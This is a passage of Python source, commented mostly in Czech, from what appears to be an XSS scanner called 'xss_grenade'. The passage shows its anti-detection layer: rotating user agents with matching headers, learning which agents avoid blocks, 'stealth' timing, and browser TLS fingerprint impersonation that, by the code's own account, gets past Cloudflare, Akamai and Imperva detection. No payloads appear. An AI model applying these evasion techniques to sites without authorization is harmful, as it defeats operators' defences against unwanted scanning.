    instantly, so a module stops within ~one request instead of running to the end.
    Wraps requests.Session and curl_cffi sessions alike (both expose .request)."""
    if cancel_event is None or sess is None:
        return sess
    try:
        _orig_request = sess.request
    except Exception:
        return sess

    def _cancellable_request(method, url, **kwargs):
        if cancel_event.is_set():
            raise requests.exceptions.RequestException("scan cancelled by user")
        return _orig_request(method, url, **kwargs)

    try:
        sess.request = _cancellable_request
        sess._cancel_event = cancel_event   # so helpers (tor-retry) can bail too
    except Exception:
        pass
    return sess


# ---------- Session factory ----------
# ══════════════════════════════════════════════════════════════════════════════
# ── USER-AGENT ROTATOR ────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════
#
# Per-request rotace UA s koherentními sekundárními hlavičkami.
# Moderní WAFy (Cloudflare, Akamai, Imperva) detekují nekonzistenci mezi
# UA stringem a hlavičkami sec-ch-ua / Accept / Accept-Language.
# Tato třída drží mapping UA → matching headers a rotuje je thread-safe.
#
# Pro každý UA vrací sekundární hlavičky, které reálný browser té rodiny
# posílá. Chrome má sec-ch-ua, Firefox ne. Safari má jiný Accept string.
# ══════════════════════════════════════════════════════════════════════════════

class UserAgentRotator:
    """
    Pokročilý thread-safe UA rotátor s 9 anti-detection features:

    1. Auto-fresh UA pool ze živého zdroje (24h cache)
    2. Per-target session affinity (sticky UA per hostname)
    3. Realistická Accept-Language distribuce + geo-aware pick
    4. Stable viewport per session (sec-ch-viewport-width)
    5. Cookie jar reset při force_rotate
    6. A/B testing — per-UA success tracking + epsilon-greedy
    7. Custom UA pool z user file
    8. Header order randomization (přes session._header_order hint)
    9. Brand version coherence (Chromium verze v sec-ch-ua matching UA)

    Použití:
        rot = UserAgentRotator(rotate_every=5, fresh=True)
        # Per-request — globální rotace:
        session.headers.update(rot.next_headers())
        # Per-target — sticky per hostname (lepší pro multi-target scan):
        session.headers.update(rot.next_headers_for(target_url))
        # Po hitu/blocku zaznamenat výsledek pro A/B learning:
        rot.record_response(ua_used, response.status_code)
    """

    # Reálná distribuce Accept-Language (StatCounter Q4 2025)
    ACCEPT_LANGUAGE_PROFILES = [
        # (jazyk, weight)
        ("en-US,en;q=0.9",                              35),
        ("en-GB,en;q=0.9",                               8),
        ("de-DE,de;q=0.9,en;q=0.8",                      6),
        ("fr-FR,fr;q=0.9,en;q=0.8",                      5),
        ("es-ES,es;q=0.9,en;q=0.8",                      4),
        ("zh-CN,zh;q=0.9,en;q=0.8",                      7),
        ("ja-JP,ja;q=0.9,en;q=0.8",                      4),
        ("ru-RU,ru;q=0.9,en;q=0.8",                      3),
        ("pt-BR,pt;q=0.9,en;q=0.8",                      3),
        ("it-IT,it;q=0.9,en;q=0.8",                      3),
        ("nl-NL,nl;q=0.9,en;q=0.8",                      2),
        ("pl-PL,pl;q=0.9,en;q=0.8",                      2),
        ("cs-CZ,cs;q=0.9,en;q=0.8",                      1),
        ("sk-SK,sk;q=0.9,cs;q=0.8,en;q=0.7",             1),
    ]

    # Country-code → boost factor pro daný jazyk (8× váha)
    COUNTRY_LANG_HINT = {
        "CZ": "cs-CZ", "SK": "sk-SK", "DE": "de-DE", "AT": "de-DE",
        "FR": "fr-FR", "ES": "es-ES", "IT": "it-IT", "NL": "nl-NL",
        "PL": "pl-PL", "RU": "ru-RU", "JP": "ja-JP", "CN": "zh-CN",
        "BR": "pt-BR", "GB": "en-GB", "UK": "en-GB",
    }

    # Realistické viewport rozměry — z W3C / browser stats
    DESKTOP_VIEWPORTS = [1920, 1536, 1440, 1366, 1280, 2560, 1600]
    MOBILE_VIEWPORTS = [390, 412, 414, 360, 393, 375]

    # Referer samply
    REFERERS = [
        "https://www.google.com/",
        "https://duckduckgo.com/",
        "https://www.bing.com/",
        "https://www.google.cz/",
        "https://www.google.de/",
        None, None, None, None,  # 4× častěji bez Referer
    ]

    # Online UA pool source — github raw, weekly updated
    UA_POOL_URL = (
        "https://raw.githubusercontent.com/microlinkhq/top-user-agents/"
        "master/src/index.json"
    )
    UA_CACHE_FILE = Path.home() / ".xss_grenade" / "ua_cache.json"
    UA_CACHE_TTL = 86400  # 24h

    # Epsilon-greedy A/B test
    EPSILON_AB = 0.20  # 20% explore, 80% exploit best UAs

    def __init__(self,
                 user_agents: Optional[List[str]] = None,
                 rotate_every: int = 5,
                 fresh: bool = True,
                 target_country: Optional[str] = None):
        """
        Args:
            user_agents: Custom UA pool. Pokud None a fresh=True, fetched live.
            rotate_every: Rotuj UA každých N requestů (per-burst, ne per-request).
            fresh: Pokud True a user_agents=None, lazy-fetch live UA pool.
            target_country: ISO code pro Accept-Language hint (CZ/DE/...).
        """
        if user_agents is None and fresh:
            user_agents = self._fetch_fresh_ua_pool()
        self._agents = list(user_agents or DEFAULT_USER_AGENTS)
        if not self._agents:
            self._agents = list(DEFAULT_USER_AGENTS)

        self._rotate_every = max(1, rotate_every)
        self._target_country = target_country

        # Globální counter (pro single-target scan)
        self._counter = 0
        self._current_ua: Optional[str] = None
        self._session_viewport: Optional[int] = None
        self._session_dpr: Optional[str] = None
        self._session_lang: Optional[str] = None

        # Per-target sticky state (#4)
        self._per_target_ua: Dict[str, str] = {}
        self._per_target_counter: Dict[str, int] = {}
        self._per_target_viewport: Dict[str, int] = {}
        self._per_target_lang: Dict[str, str] = {}
        # v10.14: navigation-aware Referer chain — poslední URL
        # navštívená per host slouží jako Referer pro další request.
        # Reset při UA rotaci (nový "uživatel" nemá historii).
        self._per_target_last_url: Dict[str, str] = {}

        # A/B test stats (#8) — {ua: {"sent": N, "blocked": N, "success": N}}
        self._ua_stats: Dict[str, Dict[str, int]] = {}

        self._lock = Lock()

    # ──────────────────────────────────────────────────────────────────
    # 1. AUTO-FRESH UA POOL
    # ──────────────────────────────────────────────────────────────────

    @classmethod
    def _fetch_fresh_ua_pool(cls) -> List[str]:
        """
        Stáhne aktuální UA pool z live github registru.
        Cache 24h. Při fail fallback na DEFAULT_USER_AGENTS.
        """
        try:
            cls.UA_CACHE_FILE.parent.mkdir(parents=True, exist_ok=True)

            # Cache hit pokud < 24h staré
            if cls.UA_CACHE_FILE.exists():
                age = time.time() - cls.UA_CACHE_FILE.stat().st_mtime
                if age < cls.UA_CACHE_TTL:
                    try:
                        cached = json.loads(cls.UA_CACHE_FILE.read_text(encoding="utf-8"))
                        if isinstance(cached, list) and len(cached) > 5:
                            return cached[:50]
                    except Exception:
                        pass  # cache corrupted, refetch

            # Fetch fresh
            r = requests.get(cls.UA_POOL_URL, timeout=10)
            r.raise_for_status()
            ua_list = r.json()
            if not isinstance(ua_list, list) or len(ua_list) < 5:
                raise ValueError("UA pool has an unexpected format")

            cls.UA_CACHE_FILE.write_text(json.dumps(ua_list), encoding="utf-8")
            logging.info(f"[OK] UA pool refreshed: {len(ua_list)} UAs ze live registru")
            return ua_list[:50]
        except Exception as e:
            logging.warning(
                f"[!]️  UA fresh fetch fail: {e} — fallback na hardcoded DEFAULT_USER_AGENTS"
            )
            return list(DEFAULT_USER_AGENTS)

    # ──────────────────────────────────────────────────────────────────
    # 2. CUSTOM UA POOL Z FILE (#7)
    # ──────────────────────────────────────────────────────────────────

    @classmethod
    def from_file(cls, path: Path, rotate_every: int = 5) -> "UserAgentRotator":
        """
        Vytvoří rotator z user-supplied souboru (jeden UA per řádek).
        Komentáře (řádky začínající #) ignorovány.
        """
        if not path.exists():
            logging.warning(f"UA file {path} neexistuje, fallback na fresh pool")
            return cls(rotate_every=rotate_every, fresh=True)

        uas = []
        for line in path.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if line and not line.startswith("#"):
                uas.append(line)

        if not uas:
            logging.warning(f"UA file {path} empty — fallback to fresh pool")
            return cls(rotate_every=rotate_every, fresh=True)

        logging.info(f"[OK] Loaded {len(uas)} UAs z {path}")
        return cls(user_agents=uas, rotate_every=rotate_every, fresh=False)

    # ──────────────────────────────────────────────────────────────────
    # 3. CORE NEXT_HEADERS (s A/B selection #8)
    # ──────────────────────────────────────────────────────────────────

    def next_headers(self) -> Dict[str, str]:
        """Globální rotace (single-target use case)."""
        with self._lock:
            need_new = (
                self._current_ua is None
                or self._counter % self._rotate_every == 0
            )
            if need_new:
                self._current_ua = self._select_ua()
                self._session_viewport = self._pick_viewport_for(self._current_ua)
                self._session_dpr = self._pick_dpr()
                self._session_lang = self._pick_accept_language()
            self._counter += 1
            ua = self._current_ua
            vp = self._session_viewport
            dpr = self._session_dpr
            lang = self._session_lang

        return self._coherent_headers_for(ua, viewport=vp, dpr=dpr, accept_lang=lang)

    def next_headers_for(self, target_url: str) -> Dict[str, str]:
        """
        Per-target sticky rotace (#4 — multi-target use case).
        Každý hostname má vlastní UA + viewport + lang, jako kdyby
        to byl jiný uživatel.

        v10.14: navigation-aware Referer chain — pamatuje si poslední
        URL navštívenou per host a používá ji jako Referer pro další
        request. To je realistický browser pattern (každý klik nese
        Referer předchozí stránky). Pokud žádná last_url není (první
        request na host), fallback na search engine / direct nav.
        """
        try:
            host = urlparse(target_url).hostname or "default"
        except Exception:
            host = "default"

        with self._lock:
            counter = self._per_target_counter.get(host, 0)
            ua = self._per_target_ua.get(host)
            vp = self._per_target_viewport.get(host)
            lang = self._per_target_lang.get(host)
            # v10.14: poslední navigovaná URL pro tento host
            last_nav_url = self._per_target_last_url.get(host)

            need_new = ua is None or counter % self._rotate_every == 0
            if need_new:
                ua = self._select_ua()
                vp = self._pick_viewport_for(ua)
                lang = self._pick_accept_language()
                self._per_target_ua[host] = ua
                self._per_target_viewport[host] = vp
                self._per_target_lang[host] = lang
                # Při UA rotaci resetuj i navigation chain — nový "uživatel"
                # nemá historii navigace na webu
                last_nav_url = None
                self._per_target_last_url.pop(host, None)

            self._per_target_counter[host] = counter + 1
            # Update last navigation URL pro příští request
            self._per_target_last_url[host] = target_url

        return self._coherent_headers_for(
            ua, viewport=vp, dpr="2", accept_lang=lang,
            referer_override=last_nav_url, current_url=target_url,
        )

    def _select_ua(self) -> str:
        """
        A/B select (#8) — epsilon-greedy:
          - 80% času pick z best-performing UAs (success rate)
          - 20% explore — random pick (objev nové úspěšné UA)
        """
        # Explore branch
        if random.random() < self.EPSILON_AB:
            return random.choice(self._agents)

        # Exploit branch — pokud máme dostatek dat, pick z top
        scored = []
        for ua, s in self._ua_stats.items():
            if s["sent"] < 5:  # min sample size
                continue
            success_rate = s["success"] / max(1, s["sent"])
            scored.append((success_rate, ua))

        if scored:
            scored.sort(reverse=True)
            top_pool = [ua for _, ua in scored[:max(3, len(scored) // 3)]]
            # Pick z top — ale obohaceno o nějaké z full poolu (avoid stagnace)
            if random.random() < 0.7 and top_pool:
                return random.choice(top_pool)

        # Fallback — pure random
        return random.choice(self._agents)

    def force_rotate(self, session: Optional[requests.Session] = None) -> str:
        """
        Vynutí okamžitou rotaci UA + viewport + lang.
        Pokud session předána, vyčistí cookie jar (#5) — nový "uživatel".
        """
        with self._lock:
            self._current_ua = self._select_ua()
            self._counter = 1
            self._session_viewport = self._pick_viewport_for(self._current_ua)
            self._session_dpr = self._pick_dpr()
            self._session_lang = self._pick_accept_language()
            new_ua = self._current_ua

        # Cookie jar reset — nový "uživatel" by neměl mít staré cookies
        if session is not None:
            try:
                session.cookies.clear()
            except Exception:
                pass

        return new_ua

    @property
    def current_ua(self) -> Optional[str]:
        return self._current_ua

    # ──────────────────────────────────────────────────────────────────
    # 4. ACCEPT-LANGUAGE PICK (#3 — geo-aware)
    # ──────────────────────────────────────────────────────────────────

    def _pick_accept_language(self) -> str:
        """
        Pick Accept-Language z reálné distribuce.
        Pokud target_country je nastaven, dej tomu jazyku 8× větší váhu.
        """
        weights = list(self.ACCEPT_LANGUAGE_PROFILES)

        if self._target_country:
            target_lang = self.COUNTRY_LANG_HINT.get(self._target_country.upper())
            if target_lang:
                weights = [
                    (lang, w * 8 if lang.startswith(target_lang) else w)
                    for lang, w in weights
                ]

        langs, ws = zip(*weights)
        return random.choices(langs, weights=ws, k=1)[0]

    # ──────────────────────────────────────────────────────────────────
    # 5. VIEWPORT / DPR (#3)
    # ──────────────────────────────────────────────────────────────────

    def _pick_viewport_for(self, ua: str) -> int:
        """Pick realistic viewport — desktop nebo mobile podle UA."""
        is_mobile = "Mobile" in ua or "Android" in ua or "iPhone" in ua
        if is_mobile:
            return random.choice(self.MOBILE_VIEWPORTS)
        return random.choice(self.DESKTOP_VIEWPORTS)

    def _pick_dpr(self) -> str:
        """Realistic device pixel ratio — 1, 1.5, 2, 2.5."""
        return random.choices(
            ["1", "1.5", "2", "2.5"],
            weights=[35, 10, 45, 10],  # 2.0 nejčastější (Retina, HiDPI)
        )[0]

    # ──────────────────────────────────────────────────────────────────
    # 6. A/B TEST — RECORD RESPONSE (#8)
    # ──────────────────────────────────────────────────────────────────

    def record_response(self, ua: str, status_code: int,
                         blocked: bool = False) -> None:
        """
        Zaznamenat výsledek requestu pro A/B učení.

        Args:
            ua: User-Agent string, který byl použit
            status_code: HTTP status code
            blocked: True pokud detekováno explicitní blokace (WAF, captcha)
        """
        if not ua:
            return

        with self._lock:
            s = self._ua_stats.setdefault(ua, {"sent": 0, "blocked": 0, "success": 0})
            s["sent"] += 1

            is_blocked = (
                blocked
                or status_code in (403, 429, 503)
                or (status_code == 401 and not self._target_country)
            )
            is_success = 200 <= status_code < 400

            if is_blocked:
                s["blocked"] += 1
            elif is_success:
                s["success"] += 1

    def stats_report(self) -> List[Dict]:
        """Vrátí seznam UA + jejich úspěšnosti — pro debugging / report."""
        with self._lock:
            report = []
            for ua, s in sorted(
                self._ua_stats.items(),
                key=lambda kv: kv[1]["success"] / max(1, kv[1]["sent"]),
                reverse=True,
            ):
                if s["sent"] < 1:
                    continue
                report.append({
                    "ua": ua[:60] + "..." if len(ua) > 60 else ua,
                    "sent": s["sent"],
                    "success": s["success"],
                    "blocked": s["blocked"],
                    "success_rate": round(s["success"] / max(1, s["sent"]), 3),
                })
            return report

    # ──────────────────────────────────────────────────────────────────
    # 7. COHERENT HEADERS (#3, #9)
    # ──────────────────────────────────────────────────────────────────

    def _coherent_headers_for(self,
                               ua: str,
                               viewport: Optional[int] = None,
                               dpr: Optional[str] = None,
                               accept_lang: Optional[str] = None,
                               referer_override: Optional[str] = None,
                               current_url: Optional[str] = None) -> Dict[str, str]:
        """
        Mapping UA → browser-realistic headers.
        Headers odpovídající browseru v UA stringu, viewport+dpr stable per session,
        Accept-Language podle distribuce.

        v10.14: referer_override + current_url enable navigation-aware
        Referer chain. Pokud referer_override je nastavený, použije
        se jako Referer a Sec-Fetch-Site se nastaví podle vztahu domén
        (same-origin / same-site / cross-site). Pokud current_url je
        None, fallback na původní random Referer.
        """
        headers: Dict[str, str] = {"User-Agent": ua}

        is_mobile = "Mobile" in ua or "Android" in ua or "iPhone" in ua
        platform = self._platform_from_ua(ua)
        accept_lang = accept_lang or "en-US,en;q=0.9"

        # ── Chrome/Chromium (including Edge) ──
        if ("Chrome/" in ua) and "Firefox" not in ua and "Safari" in ua:
            is_edge = "Edg/" in ua
            chrome_ver = self._extract_chrome_version(ua) or "132"
            brand_edge = "Microsoft Edge" if is_edge else "Google Chrome"

            headers.update({
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,"
                          "image/avif,image/webp,image/apng,*/*;q=0.8,"
                          "application/signed-exchange;v=b3;q=0.7",
                "Accept-Language": accept_lang,
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "sec-ch-ua": f'"{brand_edge}";v="{chrome_ver}", '
                             f'"Chromium";v="{chrome_ver}", '
                             f'"Not A(Brand";v="24"',
                "sec-ch-ua-mobile": "?1" if is_mobile else "?0",
                "sec-ch-ua-platform": platform,
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "max-age=0",
            })

            # Viewport hints — Chrome posílá na navigations
            if viewport is not None:
                headers["sec-ch-viewport-width"] = str(viewport)
            if dpr is not None:
                headers["sec-ch-dpr"] = dpr

        # ── Firefox ──
        elif "Firefox/" in ua:
            headers.update({
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,"
                          "image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": accept_lang.replace(";q=0.9", ";q=0.5"),
                "Accept-Encoding": "gzip, deflate, br",
                "DNT": "1",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
            })

        # ── Safari ──
        elif "Safari/" in ua and "Chrome" not in ua:
            headers.update({
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": accept_lang,
                "Accept-Encoding": "gzip, deflate, br",
            })

        # ── Fallback ──
        else:
            headers.update({
                "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                "Accept-Language": accept_lang,
                "Accept-Encoding": "gzip, deflate",
            })

        # Občasný Referer — v10.14 navigation-aware
        if referer_override and current_url:
            # Použij předchozí navigation URL jako Referer
            headers["Referer"] = referer_override
            # Sec-Fetch-Site podle vztahu mezi referer a current
            try:
                ref_parsed = urlparse(referer_override)
                cur_parsed = urlparse(current_url)
                if (ref_parsed.scheme == cur_parsed.scheme and
                        ref_parsed.netloc == cur_parsed.netloc):
                    # Stejný origin (scheme + host + port)
                    fetch_site = "same-origin"
                elif self._same_site(ref_parsed.netloc, cur_parsed.netloc):
                    # Stejný registrable domain (např. www.x.com → api.x.com)
                    fetch_site = "same-site"
                else:
                    fetch_site = "cross-site"
            except Exception:
                fetch_site = "same-origin"
            # Override Sec-Fetch-Site (Chrome/Firefox ho posílají vždy)
            if "Sec-Fetch-Site" in headers:
                headers["Sec-Fetch-Site"] = fetch_site
            # Sec-Fetch-Mode pro navigation requesty zůstává "navigate",
            # ale pro same-origin už není "?1" Sec-Fetch-User (to je
            # jen pro user-triggered navigations jako klik na link).
            # Konzervativně necháváme stávající hodnotu.
        else:
            # Fallback: random search engine / direct nav (legacy chování)
            ref = random.choice(self.REFERERS)
            if ref:
                headers["Referer"] = ref

        return headers

    @staticmethod
    def _same_site(host_a: str, host_b: str) -> bool:
        """Zjisti, jestli dva hostnames sdílí registrable domain.
        Jednoduchá heuristika (TLD+1 srovnání) — pro běžné případy
        spolehlivá, pro hraniční jako co.uk neperfektní, ale dobrá
        aproximace pro Sec-Fetch-Site klasifikaci.
        """
        if not host_a or not host_b:
            return False
        # Strip port
        a = host_a.split(":")[0].lower()
        b = host_b.split(":")[0].lower()
        if a == b:
            return True
        # Vezmi poslední 2 části (best-effort registrable domain)
        a_parts = a.split(".")
        b_parts = b.split(".")
        if len(a_parts) < 2 or len(b_parts) < 2:
            return False
        return a_parts[-2:] == b_parts[-2:]

    @staticmethod
    def _platform_from_ua(ua: str) -> str:
        if "Windows" in ua:                  return '"Windows"'
        if "Macintosh" in ua:                return '"macOS"'
        if "iPhone" in ua or "iPad" in ua:   return '"iOS"'
        if "Android" in ua:                  return '"Android"'
        if "Linux" in ua:                    return '"Linux"'
        return '"Unknown"'

    @staticmethod
    def _extract_chrome_version(ua: str) -> Optional[str]:
        """'Chrome/132.0.0.0' → '132'."""
        m = re.search(r"Chrome/(\d+)", ua)
        return m.group(1) if m else None


# ──────────────────────────────────────────────────────────────────────
# BEHAVIORAL TIMING (#7) — log-normal request delays
# ──────────────────────────────────────────────────────────────────────

# ─── v10.14: Per-host RTT (response time) tracking ──────────────────────────
# Sleduje response time per host v rolling window. Slouží k:
#   1. Adaptive delay scaling — pokud server reaguje pomalu, scanner se
#      přizpůsobuje (browser-like chování — uživatel taky čeká).
#   2. Diagnostic — log hodnoty pro pochopení server kondice.
#
# Window size: 20 posledních samplů per host (dostatečně pro průměr,
# dostatečně malé pro adaptivní reakci na změny).
_HOST_RTT_STATE: Dict[str, dict] = {}
_RTT_LOCK = Lock()
_RTT_WINDOW_SIZE = 20
# Threshold pro slow-server scaling — pod tímhle se nezpomaluje
_RTT_SCALING_THRESHOLD_SEC = 0.5
# Cap pro multiplikátor (i pomalý server scaled max 4×)
_RTT_MAX_SCALING = 4.0


def _record_host_rtt(url: str, elapsed_sec: float) -> None:
    """Zaznamenej response time per host. Volá perform_request po
    úspěšném requestu.

    Args:
        url: URL na který byl request poslán
        elapsed_sec: čas odpovědi v sekundách (response.elapsed)
    """
    if elapsed_sec is None or elapsed_sec < 0:
        return
    try:
        host = urlparse(url).netloc.lower()
    except Exception:
        return
    if not host:
        return

    with _RTT_LOCK:
        state = _HOST_RTT_STATE.get(host)
        if state is None:
            state = {"samples": [], "avg": 0.0, "last_update": 0.0}
            _HOST_RTT_STATE[host] = state
        # Rolling window — drop oldest pokud full
        samples = state["samples"]
        samples.append(elapsed_sec)
        if len(samples) > _RTT_WINDOW_SIZE:
            samples.pop(0)
        state["avg"] = sum(samples) / len(samples)
        state["last_update"] = time.time()


def _get_host_rtt_scaling(url: str) -> float:
    """Vrátí scaling faktor pro delay podle host RTT. 1.0 = žádné
    scaling (rychlý server), > 1.0 = zpomalit (pomalý server, čekáme
    proporcionálně víc).

    Pod thresholdem (default 500ms) → faktor 1.0.
    Nad thresholdem → lineární scaling cap na _RTT_MAX_SCALING.

    Vrací 1.0 také pokud host nemá enough data (< 3 samples).
    """
    try:
        host = urlparse(url).netloc.lower()
    except Exception:
        return 1.0
    if not host:
        return 1.0

    with _RTT_LOCK:
        state = _HOST_RTT_STATE.get(host)
        if state is None or len(state["samples"]) < 3:
            return 1.0
        avg = state["avg"]

    if avg <= _RTT_SCALING_THRESHOLD_SEC:
        return 1.0
    # Lineární scaling: 0.5s = 1.0×, 1.0s = 2.0×, 2.0s = 4.0× (capped)
    factor = avg / _RTT_SCALING_THRESHOLD_SEC
    return min(factor, _RTT_MAX_SCALING)


def get_host_rtt_stats() -> Dict[str, Dict[str, float]]:
    """Vrátí snapshot per-host RTT statů — pro logging / diagnostic.
    Bezpečné volat z libovolného threadu.
    """
    with _RTT_LOCK:
        return {
            host: {
                "avg_sec": state["avg"],
                "samples": len(state["samples"]),
                "last_update": state["last_update"],
            }
            for host, state in _HOST_RTT_STATE.items()
        }


def realistic_request_delay(scan_intensity: str = "normal",
                             host_url: Optional[str] = None) -> float:
    """
    Vrátí realistický delay v sekundách (log-normal distribuce).

    Reálný uživatel:
      - klikne na linky s log-normal distribucí (peak 2-5s, long tail 60s+)
      - občas má "think pause" 30-120s (čte content)
      - nikdy konsistentně > 10 req/s

    Modes:
      stealth — peak ~3s, occasional 15-60s pause (bug bounty, low-and-slow)
      normal  — peak ~0.5s (default scan, balanced)
      fast    — peak ~0.1s (rychlý scan, mírný jitter)

    v10.14: host_url enable RTT-aware scaling — pokud server je pomalý
    (avg > 500ms), delay se proporcionálně zvyšuje. Tím scanner napodobuje
    realistický browser, který taky čeká delší dobu na pomalých serverech.
    """
    if scan_intensity == "stealth":
        base = random.lognormvariate(mu=1.0, sigma=0.7)
        if random.random() < 0.05:  # 5% šance na "think pause"
            base += random.uniform(15, 60)
    elif scan_intensity == "fast":
        base = random.lognormvariate(mu=-2.0, sigma=0.5)  # ~0.1-0.3s
    else:  # normal
        base = random.lognormvariate(mu=-0.7, sigma=0.5)  # ~0.3-1.5s

    # v10.14: RTT-aware scaling
    if host_url:
        scaling = _get_host_rtt_scaling(host_url)
        base *= scaling

    return base


# ──────────────────────────────────────────────────────────────────────
# CURL_CFFI INTEGRATION (#6) — Browser TLS/HTTP2 fingerprint impersonation
# ──────────────────────────────────────────────────────────────────────

# Cache check — je curl_cffi nainstalovaný?
_CURL_CFFI_AVAILABLE: Optional[bool] = None


def is_curl_cffi_available() -> bool:
    """Lazy check, je-li curl_cffi nainstalovaný."""
    global _CURL_CFFI_AVAILABLE
    if _CURL_CFFI_AVAILABLE is None:
        try:
            import curl_cffi  # noqa: F401
            _CURL_CFFI_AVAILABLE = True
        except ImportError:
            _CURL_CFFI_AVAILABLE = False
    return _CURL_CFFI_AVAILABLE


# Available browser fingerprint profiles (curl_cffi naming)
CURL_CFFI_PROFILES = [
    "chrome131", "chrome124", "chrome120", "chrome116",
    "firefox133", "firefox120",
    "safari18_0", "safari17_0",
    "edge131",
]


def pick_cffi_profile(rotate: bool = False,
                       ua_hint: Optional[str] = None) -> str:
    """v10.14: Vybere curl_cffi impersonate profil pro session.

    Default (rotate=False): chrome131 — backwards-compatible, jediný
    profil pro celý scan. Stejný JA3 napříč všemi requesty.

    rotate=True: náhodný profil z CURL_CFFI_PROFILES. Pokud `ua_hint`
    obsahuje string UA, vybere profil **konzistentní s tímto UA**
    (Chrome UA → chrome* profil, Firefox UA → firefox* profil, atd.).
    Cíl: server vidí JA3 odpovídající UA stringu — žádný „Chrome 131 UA
    s Firefox JA3" mismatch, který by sám o sobě byl tell.

    Per-session rotace (3 hlavní sessions: main/probe/workers dostanou
    různé profily) — to dělá scan z pohledu serveru jako 3 různé
    browsery, ne jeden klient se stejným JA3 napříč všemi requesty.

    POZOR: rotace JEN per session, ne per request. Skutečný browser
    nemění JA3 mid-session — to by samo o sobě bylo detekovatelné jako
    bot tell.

    Args:
        rotate: Pokud False → vrátí "chrome131" (default).
                Pokud True → náhodný profil.
        ua_hint: Volitelný User-Agent string. Pokud obsahuje "Firefox"
                 / "Safari" / "Edg", filtruje profily na rodinu
                 odpovídající UA.

    Returns:
        Název cffi profilu z CURL_CFFI_PROFILES.
    """
    if not rotate:
        return "chrome131"

    # Filtruj profily podle UA hint (konzistence UA ↔ JA3)
    candidates = list(CURL_CFFI_PROFILES)
    if ua_hint:
        ua_lower = ua_hint.lower()
        if "firefox" in ua_lower:
            candidates = [p for p in CURL_CFFI_PROFILES
                          if p.startswith("firefox")]
        elif "edg/" in ua_lower or "edge/" in ua_lower:
            candidates = [p for p in CURL_CFFI_PROFILES
                          if p.startswith("edge")]
        elif "safari" in ua_lower and "chrome" not in ua_lower:
            # Safari UA bez Chrome string = pravý Safari
            candidates = [p for p in CURL_CFFI_PROFILES
                          if p.startswith("safari")]
        else:
            # Default: Chrome/Chromium UA → chrome* profily
            candidates = [p for p in CURL_CFFI_PROFILES
                          if p.startswith("chrome")]

    if not candidates:
        # UA neodpovídá žádné rodině — fallback chrome131
        return "chrome131"

    return random.choice(candidates)


def make_cffi_session(impersonate: str = "chrome131",
                      proxies: Optional[Dict[str, str]] = None,
                      verify_ssl: bool = False):
    """
    Vytvoří curl_cffi.requests.Session s browser TLS+HTTP2 impersonation.

    curl_cffi posílá:
      - Skutečný Chrome/Firefox JA3/JA4 TLS fingerprint
      - Chrome HTTP/2 SETTINGS frame
      - Headers ve správném pořadí
      - HTTP/3 support (QUIC)

    Tohle obejde Cloudflare/Akamai/Imperva fingerprint detection,
    protože server nevidí "python-requests masking as Chrome",
    ale skutečný Chrome 131 TLS handshake.

    Returns:
        curl_cffi.requests.Session — drop-in replacement za requests.Session
        (stejné API: .get(), .post(), .headers, .cookies, atd.)

    Raises:
        ImportError pokud curl_cffi není nainstalovaný.
    """
    if not is_curl_cffi_available():
        raise ImportError(
            "curl_cffi is not installed. Install: pip install curl_cffi"
        )

    from curl_cffi import requests as cffi_requests

    if impersonate not in CURL_CFFI_PROFILES:
        logging.warning(
            f"[!]️  curl_cffi profile '{impersonate}' is not in the list, "
            f"using 'chrome131'. Available: {', '.join(CURL_CFFI_PROFILES)}"
        )
        impersonate = "chrome131"

    s = cffi_requests.Session(impersonate=impersonate)

    if proxies:
        s.proxies.update(proxies)
    s.verify = verify_ssl

    return s


# Globální instance rotatoru — lazy init
_GLOBAL_UA_ROTATOR: Optional[UserAgentRotator] = None


def get_ua_rotator(user_agents: Optional[List[str]] = None,
                    rotate_every: int = 5,
                    fresh: bool = True,
                    target_country: Optional[str] = None,
                    ua_file: Optional[Path] = None) -> UserAgentRotator:
    """
    Vrátí globální UA rotator (singleton).

    Args:
        user_agents: Custom UA pool. Pokud None, autodetect podle ostatních params.
        rotate_every: Rotuj UA každých N requestů.
        fresh: Pokud True a žádná custom pool, fetch live ze github.
        target_country: ISO code (CZ/DE/...) pro Accept-Language hint.
        ua_file: Path k user-supplied UA souboru. Má prioritu nad fresh fetchem.
    """
    global _GLOBAL_UA_ROTATOR
    if _GLOBAL_UA_ROTATOR is None:
        if ua_file is not None and Path(ua_file).exists():
            _GLOBAL_UA_ROTATOR = UserAgentRotator.from_file(
                Path(ua_file), rotate_every=rotate_every
            )
            _GLOBAL_UA_ROTATOR._target_country = target_country
        else:
            _GLOBAL_UA_ROTATOR = UserAgentRotator(
                user_agents=user_agents,
                rotate_every=rotate_every,
                fresh=fresh,
                target_country=target_country,
            )
    return _GLOBAL_UA_ROTATOR


def reset_ua_rotator() -> None:
    """Vyresetuje globální rotator (např. mezi scany)."""
    global _GLOBAL_UA_ROTATOR
    _GLOBAL_UA_ROTATOR = None


def _ua_rotator_hook(rotator: UserAgentRotator):
    """Helper closure pro before-request UA refresh."""
    def _apply(session):
        session.headers.update(rotator.next_headers())
    return _apply


def make_session(pool_size=POOL_SIZE, verify_ssl=True, rotate_ua=True,
                 user_agents=None, proxies=None,
                 max_retries=DEFAULT_RETRIES, backoff=DEFAULT_BACKOFF,
                 ua_rotator: Optional[UserAgentRotator] = None,
                 cffi_impersonate: Optional[str] = None,
                 legacy_tls: bool = False,
                 adaptive_throttle: bool = True):
    """
    Vytvoří requests.Session (nebo curl_cffi.Session) s:
      - curl_cffi browser TLS+HTTP2 impersonation (AUTO-DEFAULT když
        dostupné — browser-grade JA3/JA4 zdarma pro každý scan)
      - TLSAdapter s browser-realistickým ClientHello (requests fallback
        když curl_cffi není nainstalované)
      - Pool connections (default 100)
      - Proxies (HTTP/HTTPS/SOCKS)
      - UA rotator (per-request header rotation)

    Args:
